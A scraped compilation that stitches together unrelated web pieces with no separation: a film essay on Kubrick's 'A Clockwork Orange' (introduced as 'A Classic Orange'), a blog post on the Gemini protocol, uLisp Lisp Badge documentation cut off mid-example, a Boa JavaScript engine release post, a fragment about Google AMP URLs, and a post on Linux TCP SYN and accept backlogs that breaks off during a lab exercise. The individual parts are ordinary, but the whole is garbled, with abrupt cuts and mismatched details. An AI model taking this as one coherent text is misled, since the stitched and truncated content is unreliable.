            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>

<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>
<h3><span>Specification</span></h3>
<p><strong>Size:</strong> 107mm x 61mm (4.2" x 2.4").</p>
<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>
<h4><strong>Language</strong></h4>
<p>uLisp, a subset of Common Lisp, with 122 Lisp functions and special forms. For a full definition see <a href="http://www.ulisp.com/show?3L" target="_blank">uLisp Language Reference</a>.</p>
<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>

  <article>
    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<div><div><pre><code>+----------------------------+-----------+-----------------+----------+------------+
| Item                       | Self time | % of total time | Time     | Item count |
+----------------------------+-----------+-----------------+----------+------------+
| From&lt;Object&gt;               | 1.04ms    | 14.776          | 1.04ms   | 146        |
+----------------------------+-----------+-----------------+----------+------------+

+----------------------------+-----------+-----------------+----------+------------+
| create_instrinsics         | 263.50µs  | 3.756           | 6.38ms   | 1          |
+----------------------------+-----------+-----------------+----------+------------+
| make_builtin_fn: toString  | 218.50µs  | 3.114           | 290.50µs | 12         |
+----------------------------+-----------+-----------------+----------+------------+
| String                     | 81.60µs   | 1.163           | 961.60µs | 1          |
+----------------------------+-----------+-----------------+----------+------------+
</code></pre></div></div>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

        <p>Take a look at the below screenshot from Safari for iOS. What website am I on?</p>

<p><img src="https://theinternetbytes.com/images/amp-nytimes-example.png" alt="AMP Example with NYTimes"></p>

<p>Based on the contents of the page, I think I’m on The New York Times’ site.
However, based on the domain visible in the address bar,
I think I’m on <code>google.com</code>. If I click in the address bar
I see <code>https://www.google.com/amp/s/www.nytimes.com/2020/05/22/technology/google-antitrust.amp.html</code>.
So, where am I? What am I looking at? What’s up with the mix of Google and
New York Times’ branding? Do I trust the contents of the page or the address
bar? How does the content of the page and the address bar relate in this context
and elsewhere on the web?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
